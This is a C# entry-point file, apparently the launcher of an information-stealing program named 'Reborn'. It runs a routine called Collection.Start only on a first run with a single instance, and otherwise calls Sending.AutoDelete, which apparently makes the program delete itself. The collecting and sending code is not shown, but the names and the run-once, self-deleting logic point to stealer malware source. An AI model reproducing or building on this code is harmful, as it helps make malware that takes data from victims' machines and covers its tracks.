using Natasha.Properties;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Windows.Forms;

namespace Reborn
{
    static class Program
    {
        [STAThread]
        static void Main()
        {
            try
            {
                
                //{
                    if (!File.Exists(Help.DirectoryBuild + Config.ID))
                    {
                        if (Process.GetProcessesByName(Process.GetCurrentProcess().ProcessName).Length == 1)
                        {
                            Collection.Start();
                        }
                        else
                        {
                            Console.WriteLine("3");
                            Sending.AutoDelete();
                        }
                    }
                    else
                    {
                        Console.WriteLine("2");
                        Sending.AutoDelete();
                    }
                //}
                //else
                //{
                //    Console.WriteLine("1");
                //    Sending.AutoDelete();
                //}
                Console.WriteLine("r");
            }
            catch(Exception e)
            {
                Console.WriteLine(e + "r");
            }
        }
    }
}
